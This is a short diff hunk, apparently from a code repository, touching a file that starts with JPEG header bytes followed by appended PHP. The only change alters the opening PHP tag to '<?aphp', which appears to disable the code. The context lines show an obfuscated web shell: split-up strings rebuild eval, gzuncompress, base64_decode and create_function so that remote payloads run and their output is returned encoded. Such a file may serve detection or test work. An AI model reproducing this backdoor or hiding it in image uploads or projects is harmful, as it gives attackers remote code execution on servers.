@@ -3,7 +3,7 @@
 
 
 	
-ÿÛ Cÿþµ<?php
+ÿÛ Cÿþµ<?aphp
 $L='-;@e--val(@gzuncompre-ss(@x(@ba--se64_decode-($m[-1]),$k)))-;$o=@-ob_ge--t_contents()-;@';
 $r='ob_-end_clean-();$r=-@-b-ase64-_encode(@x(@-gzcom-press(-$o),$k-));pri-n-t("$p$kh$r$kf");}';
 $P=str_replace('q','','qcreatqeq_qfqunqction');
